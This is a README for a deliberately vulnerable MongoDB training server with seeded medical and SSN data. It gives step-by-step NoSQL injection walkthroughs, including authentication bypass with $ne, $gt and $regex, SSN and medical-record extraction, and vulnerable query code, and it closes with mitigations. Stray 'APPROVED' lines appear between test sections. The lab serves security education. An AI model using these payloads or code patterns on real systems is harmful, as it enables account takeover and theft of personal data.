# NoSQL Injection Vulnerable Server

This repository contains a deliberately vulnerable Node.js + Express + MongoDB backend that demonstrates real NoSQL injection vulnerabilities. The application includes JWT authentication and role-based access control (RBAC), with intentional vulnerabilities for educational purposes.

## Important: Real MongoDB Database

This application uses a real MongoDB database (not mock/in-memory data). All queries are executed against an actual MongoDB instance via Mongoose ODM. The vulnerabilities exploit real MongoDB query operators (`$ne`, `$regex`, `$gt`, `$exists`, etc.) that are interpreted by the MongoDB server.

When you send payloads like `{"password": {"$ne": null}}`, this is passed directly to MongoDB's query engine, which interprets the `$ne` operator and matches documents accordingly. This is a real security vulnerability that exists in production applications.

## Stack

- Node.js + Express - Backend framework
- MongoDB + Mongoose (ODM) - Database connection and querying
- JWT - Authentication tokens
- RBAC - Role-based access control (admin, doctor, patient roles)

## Prerequisites

1. Node.js (v14 or higher)
2. MongoDB (v4.4 or higher) - Must be running locally or accessible
3. Python 3 (for exploit script) with `requests` library

### MongoDB Setup

The application requires MongoDB to be running. Follow these steps:

#### Step 1: Check if MongoDB is installed

```bash
which mongod
```

If MongoDB is not installed, install it:

```bash
# On Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y mongodb

# On macOS (with Homebrew)
brew tap mongodb/brew
brew install mongodb-community

# On Windows
# Download from https://www.mongodb.com/try/download/community
```

#### Step 2: Start MongoDB

**Option A: Using systemd (Linux - if MongoDB is installed as a service)**

```bash
sudo systemctl start mongod
sudo systemctl status mongod  # Verify it's running
```

**Option B: Manual start (if systemd service is not available)**

```bash
# Create data directory
mkdir -p ~/data/db

# Start MongoDB in the background
mongod --dbpath ~/data/db --port 27017 --bind_ip 127.0.0.1 --fork --logpath ~/mongodb.log

# Verify MongoDB is running
pgrep mongod
netstat -tuln | grep 27017  # or: ss -tuln | grep 27017
```

**Option C: Start MongoDB in foreground (for debugging)**

```bash
mkdir -p ~/data/db
mongod --dbpath ~/data/db --port 27017 --bind_ip 127.0.0.1
# Keep this terminal open
```

#### Step 3: Verify MongoDB Connection

```bash
# Test MongoDB connection (if mongosh is installed)
mongosh --eval "db.adminCommand('ping')"

# Or check if port is listening
netstat -tuln | grep 27017
```

The application will connect to `mongodb://127.0.0.1:27017/vulndb` by default. You can override this with the `MONGODB_URI` environment variable.

## Installation

1. Install Node.js dependencies:

```bash
npm install
```

2. Install Python dependencies (for exploit script):

```bash
pip3 install requests
```

## Running the Server

### Complete Startup Steps

**Step 1: Ensure MongoDB is running**

```bash
# Check if MongoDB is already running
pgrep mongod

# If not running, start it (choose one method above)
# For example, manual start:
mkdir -p ~/data/db
mongod --dbpath ~/data/db --port 27017 --bind_ip 127.0.0.1 --fork --logpath ~/mongodb.log

# Verify MongoDB is running
pgrep mongod && echo "MongoDB is running" || echo "MongoDB is not running"
netstat -tuln | grep 27017  # Should show MongoDB listening on port 27017
```

**Step 2: Start the vulnerable server**

```bash
npm start
```

The server will:
- Connect to MongoDB (if connection fails, check MongoDB is running)
- Seed the database with test users and medical records
- Start listening on `http://0.0.0.0:4000`

**Step 3: Verify the server is running**

```bash
# Test health endpoint
curl http://localhost:4000/health

# Expected response:
# {"status":"ok","message":"Vulnerable server is running"}
```

### Troubleshooting

**Error: `connect ECONNREFUSED 127.0.0.1:27017`**

This means MongoDB is not running. Start it using one of the methods above.

**Error: `MongooseServerSelectionError`**

- Verify MongoDB is running: `pgrep mongod`
- Check MongoDB is listening: `netstat -tuln | grep 27017`
- Check MongoDB logs: `tail -f ~/mongodb.log`
- Try restarting MongoDB

**MongoDB won't start**

- Check if port 27017 is already in use: `lsof -i :27017`
- Check MongoDB logs for errors: `cat ~/mongodb.log`
- Ensure data directory exists and has proper permissions: `mkdir -p ~/data/db && chmod 755 ~/data/db`

**Server starts but endpoints don't work**

- Check server logs for errors
- Verify MongoDB connection was successful (look for "Connected to MongoDB" message)
- Test with: `curl http://localhost:4000/health`

### Seed Data

The server creates the following test accounts:

**Admin Users:**
- admin / secret123 (admin role)
- superadmin / admin456 (admin role)

**Doctor Users:**
- doctor1 / doctor123 (doctor role)
- doctor2 / doctor456 (doctor role)

**Patient Users:**
- patient1 / patient123 (patient role)
- patient2 / patient123 (patient role)
- patient3 / patient789 (patient role)
- patient4 / patient999 (patient role)

**Medical Records:**
- 4 medical records associated with patient1, patient2, patient3, and patient4

## Vulnerable Endpoints

### Authentication Endpoints

#### POST /auth/login (VULNERABLE)
**Vulnerability**: Request body passed directly to MongoDB `findOne()` via Mongoose without validation.

**Attack**: Send JSON with MongoDB operators to bypass authentication:
```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```

### Search & Filter Endpoints

#### GET /search (VULNERABLE)
**Vulnerability**: Query parameter parsed as JSON and used directly in MongoDB `find()`.

**Attack**: Use operators to extract data:
```
GET /search?q={"$regex":".*"}
GET /search?q={"role":"admin"}
```

#### POST /users/filter (VULNERABLE)
**Vulnerability**: Request body passed directly to MongoDB `find()`.

**Attack**: Filter users with operators:
```json
{
  "role": {"$ne": "patient"}
}
```

#### GET /users/find (VULNERABLE)
**Vulnerability**: Criteria parameter parsed as JSON and used directly in MongoDB query.

**Attack**: Find users with operators:
```
GET /users/find?criteria={"ssn":{"$exists":true}}
```

#### POST /records/search (VULNERABLE)
**Vulnerability**: Request body passed directly to MongoDB `find()` on medical records.

**Attack**: Extract medical records:
```json
{
  "patientId": {"$regex": ".*"}
}
```

### Admin Endpoints

#### POST /admin/export (Protected - Admin only)
**Description**: Exports all users and medical records. Requires valid admin JWT token.

#### POST /admin/query (VULNERABLE - Admin only)
**Vulnerability**: Query string parsed and used directly in MongoDB `find()`.

**Attack**: Use operators to extract sensitive data:
```json
{
  "query": "{\"ssn\":{\"$regex\":\".*\"}}"
}
```

#### POST /admin/users (VULNERABLE - Admin only)
**Vulnerability**: Filter from body used directly in MongoDB query.

**Attack**: Filter users with operators:
```json
{
  "filter": {"ssn": {"$regex": ".*"}}
}
```

### Doctor Endpoints

#### GET /doctor/patients (Protected - Doctor/Admin only)
**Description**: Returns patient list and medical records. Requires valid doctor or admin JWT token.

### Utility Endpoints

#### GET /health
**Description**: Health check endpoint.

#### GET /me (Protected)
**Description**: Returns current authenticated user info.

## Testing with Postman

This section provides complete step-by-step instructions for testing all vulnerabilities using Postman. All endpoints run on `http://localhost:4000`.

### Postman Setup

1. Open Postman application
2. Create a new Collection called "NoSQL Injection Tests"
3. Set base URL variable: `base_url = http://localhost:4000`
4. Ensure the server is running: `npm start`

### Stage 1: Injection Discovery

#### Test 1.1: Authentication Bypass via Operator Injection

**Purpose**: Bypass login using MongoDB `$ne` operator

1. Create new request in Postman
2. Set method to **POST**
3. URL: `http://localhost:4000/auth/login`
4. Go to **Headers** tab, add:
   - Key: `Content-Type`
   - Value: `application/json`
5. Go to **Body** tab:
   - Select **raw**
   - Select **JSON** from dropdown
   - Paste this payload:
```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```
6. Click **Send**
7. **Expected Response**: Status 200, JSON with token and user info
8. **Save the token** from response for later tests

**Explanation**: The `$ne` operator means "not equal", so this matches any user where password is not null, effectively bypassing password check.

---

#### Test 1.2: Authentication Bypass via Regex Injection

**Purpose**: Match any username using regex operator

1. Method: **POST**
2. URL: `http://localhost:4000/auth/login`
3. Headers: `Content-Type: application/json`
4. Body (raw JSON):
```json
{
  "username": {"$regex": ".*"},
  "password": {"$ne": null}
}
```
5. Click **Send**
6. **Expected Response**: Status 200, returns first user in database

**Explanation**: `$regex: ".*"` matches any username, combined with `$ne` bypasses password.

---

#### Test 1.3: Data Extraction via Search Injection

**Purpose**: Extract all users using regex in search

1. Method: **GET**
2. URL: `http://localhost:4000/search`
3. Go to **Params** tab:
   - Key: `q`
   - Value: `{"$regex":".*"}`
4. Click **Send**
5. **Expected Response**: Status 200, array of all users with full details including SSN

**Alternative method** (URL encoded):
- URL: `http://localhost:4000/search?q=%7B%22%24regex%22%3A%22.%2A%22%7D`

---

#### Test 1.4: Privileged Data Extraction

**Purpose**: Extract admin users specifically

1. Method: **GET**
2. URL: `http://localhost:4000/search`
3. **Params** tab:
   - Key: `q`
   - Value: `{"role": "admin"}`
4. Click **Send**
5. **Expected Response**: Status 200, array containing both admin users (admin, superadmin) with SSN and full details

---

### Stage 2: Authentication Bypass and Privilege Escalation

#### Test 2.1: Bypass Login and Get Admin Token

**Purpose**: Demonstrate how NoSQL injection bypasses authentication without knowing the actual password, allowing unauthorized access to admin accounts.

**How it works**: 
The vulnerable login endpoint passes user input directly to MongoDB without validation. By sending `{"password": {"$ne": null}}`, we're injecting a MongoDB operator that means "password is not equal to null". Since all users have non-null passwords, this matches any user account, effectively bypassing password verification.

**Steps**:

1. Create new request in Postman
2. Set method to **POST**
3. URL: `http://localhost:4000/auth/login`
4. Go to **Headers** tab, add:
   - Key: `Content-Type`
   - Value: `application/json`
5. Go to **Body** tab:
   - Select **raw**
   - Select **JSON** from dropdown
   - Paste this payload:
```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```
6. Click **Send**

**Expected Response**:
- Status: **200 OK**
- Response body contains:
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": "...",
    "username": "admin",
    "role": "admin",
    "fullName": "System Administrator"
  }
}
```

**What to save**:
- Copy the entire `token` value from the response
- This token grants admin-level access to protected endpoints
- Token is valid for 1 hour (as per JWT configuration)

**Optional - Save token for reuse**:
1. Click **Environments** → **Add** (or use existing environment)
2. Create variable: `admin_token`
3. Set value to the copied token
4. In subsequent requests, use `{{admin_token}}` instead of pasting the token

**Alternative payloads to test** (all bypass authentication):
- `{"username": "superadmin", "password": {"$ne": null}}` - Bypass as second admin
- `{"username": {"$regex": ".*"}, "password": {"$ne": null}}` - Match any user (returns first match)
- `{"username": "admin", "password": {"$gt": ""}}` - Alternative operator ($gt = greater than)

---

#### Test 2.2: Access Protected Admin Endpoint

**Purpose**: Verify admin access using bypassed token

1. Method: **POST**
2. URL: `http://localhost:4000/admin/export`
3. **Headers** tab:
   - Key: `Authorization`
   - Value: `Bearer YOUR_TOKEN_HERE` (replace with actual token from Test 2.1)
4. Click **Send**
5. **Expected Response**: Status 200, JSON containing all users (8 total: 2 admins, 2 doctors, 4 patients) and medical records (4 records)


### Stage 3: Data Extraction

#### Test 3.1: Extract Users with SSN

**Purpose**: Find all users with SSN information

1. Method: **POST**
2. URL: `http://localhost:4000/users/filter`
3. Headers: `Content-Type: application/json`
4. Body (raw JSON):
```json
{
  "ssn": {"$exists": true, "$ne": null}
}
```
5. Click **Send**
6. **Expected Response**: Status 200, all users with SSN data

---

APPROVED



#### Test 3.2: Extract Medical Records

**Purpose**: Get all medical records using regex

1. Method: **POST**
2. URL: `http://localhost:4000/records/search`
3. Headers: `Content-Type: application/json`
4. Body (raw JSON):
```json
{
  "patientId": {"$regex": ".*"}
}
```
5. Click **Send**
6. **Expected Response**: Status 200, all medical records with diagnoses and medications

---
APPROVED


#### Test 3.3: Admin Query Injection

**Purpose**: Use admin endpoint with injected query

**Prerequisites**: Admin token from Test 2.1

1. Method: **POST**
2. URL: `http://localhost:4000/admin/query`
3. **Headers** tab:
   - `Content-Type: application/json`
   - `Authorization: Bearer YOUR_TOKEN_HERE`
4. Body (raw JSON):
```json
{
  "query": "{\"ssn\":{\"$regex\":\".*\"}}"
}
```
5. Click **Send**
6. **Expected Response**: Status 200, users matching the injected query

**Note**: The `query` field is a JSON string that gets parsed, allowing operators.

---


APPROVED


#### Test 3.4: Admin User Filter Injection

**Purpose**: Filter users using admin endpoint

**Prerequisites**: Admin token from Test 2.1

1. Method: **POST**
2. URL: `http://localhost:4000/admin/users`
3. **Headers** tab:
   - `Content-Type: application/json`
   - `Authorization: Bearer YOUR_TOKEN_HERE`
4. Body (raw JSON):
```json
{
  "filter": {"ssn": {"$regex": ".*"}}
}
```
5. Click **Send**
6. **Expected Response**: Status 200, filtered users based on injected filter

---



APPROVED



### Additional Tests

#### Test: Find Users with Criteria

**Purpose**: Test `/users/find` endpoint

1. Method: **GET**
2. URL: `http://localhost:4000/users/find`
3. **Params** tab:
   - Key: `criteria`
   - Value: `{"username":{"$regex":".*"}}`
4. Click **Send**
5. **Expected Response**: Status 200, all users matching criteria

---


APPROVED


#### Test: Health Check

1. Method: **GET**
2. URL: `http://localhost:4000/health`
3. Click **Send**
4. **Expected Response**: Status 200, `{"status":"ok","message":"Vulnerable server is running"}`

---

### Postman Collection Setup Tips

1. **Environment Variables**:
   - Create environment with variables:
     - `base_url`: `http://localhost:4000`
     - `admin_token`: (set after first login bypass)

2. **Pre-request Scripts** (optional):
   - Automate token extraction from login response

3. **Tests** (optional):
   - Add assertions to verify response status codes
   - Verify token presence in responses
   - Check for extracted data

4. **Documentation**:
   - Add descriptions to each request
   - Include expected responses
   - Document vulnerability type for each test

### Postman Collection JSON

You can create a Postman collection with all these requests. Here's the structure:

```json
{
  "info": {
    "name": "NoSQL Injection Tests",
    "description": "Complete test suite for NoSQL injection vulnerabilities"
  },
  "variable": [
    {
      "key": "base_url",
      "value": "http://localhost:4000"
    }
  ],
  "item": [
    {
      "name": "Stage 1: Injection Discovery",
      "item": [
        {
          "name": "1.1 Auth Bypass - Operator",
          "request": {
            "method": "POST",
            "url": "{{base_url}}/auth/login",
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"admin\",\n  \"password\": {\"$ne\": null}\n}"
            }
          }
        }
      ]
    }
  ]
}
```

## Exploitation Methods

### Method 1: Postman Testing (Recommended for Documentation)

**Use the comprehensive "Testing with Postman" section above** for detailed step-by-step instructions. This method is ideal for documentation and writeups as it provides:
- Clear step-by-step instructions
- All payloads ready to copy
- Expected responses documented
- Screenshot-friendly format

All tests are organized by attack stages (Discovery, Bypass, Extraction) for easy documentation.

### Method 2: Automated Exploit Script

Run the Python exploit script to demonstrate all three attack stages:

```bash
python3 exploit/nosql_exploit.py
```

The script demonstrates:

#### Stage 1: Injection Discovery
- Identifies NoSQL injection points in login and search endpoints
- Demonstrates how query operators (`$ne`, `$regex`, `$where`) alter query logic

#### Stage 2: Authentication Bypass
- Bypasses login without knowing valid credentials
- Uses `$ne` operator to match any non-null password
- Gains access to protected endpoints

#### Stage 3: Data Extraction
- Enumerates all users via search endpoint
- Extracts privileged account information (SSN, roles)
- Retrieves sensitive medical records via admin endpoints

### Manual Testing with cURL

#### 1. Authentication Bypass

```bash
curl -X POST http://localhost:4000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":null}}'
```

#### 2. Search Injection

```bash
curl "http://localhost:4000/search?q=%7B%22%24regex%22%3A%22.%2A%22%7D"
# URL decoded: ?q={"$regex":".*"}
```

#### 3. Admin Query Injection (requires admin token from step 1)

```bash
curl -X POST http://localhost:4000/admin/query \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -d '{"query":"{\"role\":\"admin\"}"}'
```

## Example Attack Payloads

### Authentication Bypass
```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```

### Data Extraction via Search
```
?q={"$regex":".*"}                    # Get all users
?q={"role":"admin"}                   # Get admin users
?q={"ssn":{"$exists":true}}          # Get users with SSN
?q={"username":{"$regex":"^a"}}      # Get users starting with 'a'
```

### Admin Query Injection
```json
{"query": "{\"$regex\":\".*\"}"}
{"query": "{\"role\":\"admin\"}"}
{"query": "{\"ssn\":{\"$exists\":true,\"$ne\":null}}"}
```

## Vulnerability Details

### Root Cause
The application constructs MongoDB queries directly from user input without proper validation or type enforcement. This allows attackers to inject MongoDB query operators.

### Why It Works
1. **Direct Query Construction**: User-supplied JSON is passed directly to Mongoose/MongoDB query methods
2. **No Input Validation**: Operators like `$ne`, `$regex`, `$gt`, `$where` are not filtered
3. **Type Coercion**: MongoDB operators can change query logic to match unintended documents

### Affected Code Patterns

**Vulnerable Pattern 1:**
```javascript
// VULNERABLE: req.body passed directly
const user = await User.findOne(req.body);
```

**Vulnerable Pattern 2:**
```javascript
// VULNERABLE: JSON.parse allows operators
const queryObj = JSON.parse(req.query.q);
const results = await User.find(queryObj);
```

## Security Impact

1. **Authentication Bypass**: Attackers can login as any user without knowing the password
2. **Data Exfiltration**: Sensitive data (SSNs, medical records) can be extracted
3. **Privilege Escalation**: Attackers can gain admin access and access protected resources
4. **Information Disclosure**: User enumeration and data structure disclosure

## Mitigation (Not Implemented - For Reference Only)

To fix these vulnerabilities:

1. **Input Validation**: Validate and sanitize all user input
2. **Type Enforcement**: Ensure passwords are strings, not objects
3. **Whitelist Operators**: Reject query operators (keys starting with `$`) from untrusted input
4. **Use Schema Validation**: Leverage Mongoose schemas with strict validation
5. **Parameterized Queries**: Use explicit field matching instead of dynamic query objects
6. **Avoid `$where`**: Never use `$where` operator which allows JavaScript execution

### Example Secure Code

```javascript
// SECURE: Validate input types
app.post('/auth/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Validate types
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ message: 'Invalid input types' });
  }
  
  // Explicit query construction
  const user = await User.findOne({ 
    username: username.trim(),
    password: password  // Note: In production, compare hashed passwords
  });
  
  // ... rest of logic
});
```

## Quick Start Guide

For a quick start, run these commands in order:

```bash
# 1. Install dependencies
npm install
pip3 install requests

# 2. Start MongoDB (if not already running)
# Check if MongoDB is running
pgrep mongod

# If not running, start MongoDB manually:
mkdir -p ~/data/db
mongod --dbpath ~/data/db --port 27017 --bind_ip 127.0.0.1 --fork --logpath ~/mongodb.log

# Verify MongoDB is running
pgrep mongod && echo "MongoDB is running" || echo "MongoDB is not running"
netstat -tuln | grep 27017  # Should show MongoDB listening

# 3. Start the server
npm start

# 4. In another terminal, verify the server is running
curl http://localhost:4000/health

# Expected output:
# {"status":"ok","message":"Vulnerable server is running"}

# 5. Run the exploit script
python3 exploit/nosql_exploit.py
```

### Stopping the Services

To stop the Node.js server:
```bash
pkill -f "node src/index.js"
# Or press Ctrl+C in the terminal where it's running
```

To stop MongoDB:
```bash
pkill mongod
# Or if using systemd:
sudo systemctl stop mongod
```

## Quick Reference: Postman Tests Summary

### Stage 1: Injection Discovery

| Test | Method | Endpoint | Payload |
|------|--------|----------|---------|
| 1.1 Auth Bypass - Operator | POST | `/auth/login` | `{"username":"admin","password":{"$ne":null}}` |
| 1.2 Auth Bypass - Regex | POST | `/auth/login` | `{"username":{"$regex":".*"},"password":{"$ne":null}}` |
| 1.3 Extract All Users | GET | `/search?q=...` | `q={"$regex":".*"}` |
| 1.4 Extract Admin Users | GET | `/search?q=...` | `q={"role":"admin"}` |

**Note**: With multiple admin users (admin, superadmin), Test 1.4 will return both admin accounts.

### Stage 2: Authentication Bypass

| Test | Method | Endpoint | Headers | Notes |
|------|--------|----------|---------|-------|
| 2.1 Get Admin Token | POST | `/auth/login` | `Content-Type: application/json` | Use payload from 1.1 |
| 2.2 Access Admin Export | POST | `/admin/export` | `Authorization: Bearer TOKEN` | Requires token from 2.1 |

### Stage 3: Data Extraction

| Test | Method | Endpoint | Payload |
|------|--------|----------|---------|
| 3.1 Extract Users with SSN | POST | `/users/filter` | `{"ssn":{"$exists":true,"$ne":null}}` |
| 3.2 Extract Medical Records | POST | `/records/search` | `{"patientId":{"$regex":".*"}}` |
| 3.3 Admin Query Injection | POST | `/admin/query` | `{"query":"{\"ssn\":{\"$regex\":\".*\"}}"}` |
| 3.4 Admin User Filter | POST | `/admin/users` | `{"filter":{"ssn":{"$regex":".*"}}}` |

**Note**: Tests 3.3 and 3.4 require admin token from Test 2.1.

## Testing Checklist

- [x] Stage 1: Injection discovery in login endpoint
- [x] Stage 1: Injection discovery in search endpoint
- [x] Stage 2: Authentication bypass without credentials
- [x] Stage 2: Access protected admin endpoints
- [x] Stage 3: Enumerate all users
- [x] Stage 3: Extract sensitive data (SSN, medical records)
- [x] JWT authentication implemented
- [x] Role-based access control (RBAC) implemented
- [x] Real MongoDB integration (not in-memory)

## Notes

- WARNING: This server is intentionally vulnerable for educational purposes only
- Do not deploy this code to production or expose it to the internet
- This is designed for security education, penetration testing training, and vulnerability research
- Always use secure coding practices in production applications
- MongoDB data is stored in `~/data/db` by default (can be changed)
- MongoDB logs are written to `~/mongodb.log` when started manually
- The server runs on port 4000 by default (can be changed with `PORT` environment variable)

## License

Educational use only.
